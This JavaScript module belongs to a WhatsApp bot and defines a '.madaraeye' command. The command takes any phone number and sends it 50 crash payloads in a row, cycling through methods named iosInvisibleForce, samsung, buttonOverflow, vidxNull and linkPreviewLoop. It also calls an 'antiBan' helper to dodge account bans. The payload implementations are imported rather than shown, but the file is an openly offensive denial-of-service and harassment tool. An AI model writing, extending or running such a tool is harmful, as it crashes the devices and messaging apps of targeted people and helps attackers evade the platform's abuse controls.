'use strict';
const { MadaraEye } = require('../../lib/madaraEye');
const { createProgressBar } = require('../../lib/progressBar');
const { canCrash, recordCrash } = require('../../lib/antiBan');

module.exports = {
    name: 'madaraeye',
    aliases: ['crash', 'crashall', 'executeall', 'maxcrash', 'eye'],
    category: 'madaraeye',
    desc: 'ᴍᴀᴅᴀʀᴀ ᴇʏᴇ — ᴀʟʟ ᴄʀᴀsʜ ᴍᴇᴛʜᴏᴅs',
    usage: '.madaraeye <number>',
    waitReact: true,

    async execute(sock, msg, args, ctx) {
        const s = ctx.settings;
        const prefix = s.prefix || '.';
        const phone = sock._sessionPhone || sock.user?.id?.split(':')[0] || 'default';
        
        if (!args[0]) {
            return sock.sendMessage(ctx.from, { text: `❌ *ᴡʀᴏɴɢ ᴜsᴀɢᴇ*\n\n📌 *Usage:* ${prefix}madaraeye <number>` }, { quoted: msg });
        }
        
        const target = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
        
        try { await canCrash(phone); } catch (e) { return sock.sendMessage(ctx.from, { text: `❌ ${e.message}` }, { quoted: msg }); }
        
        let eye = global.getMadaraEye?.(sock);
        if (!eye) eye = new MadaraEye(sock);
        
        const TOTAL = 50;
        const bar = createProgressBar(sock, ctx.from, TOTAL, msg);
        
        const methods = ['iosInvisibleForce', 'samsung', 'buttonOverflow', 'vidxNull', 'linkPreviewLoop'];
        
        try {
            for (let i = 0; i < TOTAL; i++) {
                try { await canCrash(phone); } catch (e) { await bar.done(`🛡️ ${e.message}\n✅ ᴘᴀʀᴛɪᴀʟ: ${i} ᴘᴀʏʟᴏᴀᴅs`); return; }
                const method = methods[i % methods.length];
                await eye[method](target, msg);
                await recordCrash(phone);
                await bar.update(1, method);
            }
            await bar.done(`✅ ᴍᴀᴅᴀʀᴀ ᴇʏᴇ ᴄᴏᴍᴘʟᴇᴛᴇ\n📊 ${TOTAL} ᴘᴀʏʟᴏᴀᴅs`);
        } catch (e) { await bar.done(`❌ ᴇʀʀᴏʀ: ${e.message}`); }
    }
};